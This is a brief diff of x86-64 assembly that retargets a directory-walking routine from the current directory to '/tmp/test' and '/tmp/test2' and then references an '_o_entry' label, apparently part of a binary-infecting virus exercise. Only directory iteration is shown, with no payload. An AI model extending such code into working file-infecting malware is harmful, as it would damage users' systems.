@@ -48,12 +48,21 @@ _start:
 	push r15
 ;;;;;;;;;;;;;;;;;;;;;;
 ;	push 0x000000000000002f ; /
-	push 0x000000000000002e ; .
-	push 0x000000000000002e
+	mov rax, 0x0000000000000000
+	push rax
+	push rax
+	mov rax, 0x747365742f706d74
+	push rax
 	mov rdi, rsp
 	mov rsi, rsp
-	add rsi, 8
+	add rsi, 16
 	call _read_dir
+	mov BYTE [rsp + 8], 0x32
+	mov rdi, rsp
+	mov rsi, rsp
+	add rsi, 16
+	call _read_dir
+	pop rdi
 	pop rdi
 	pop rdi
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
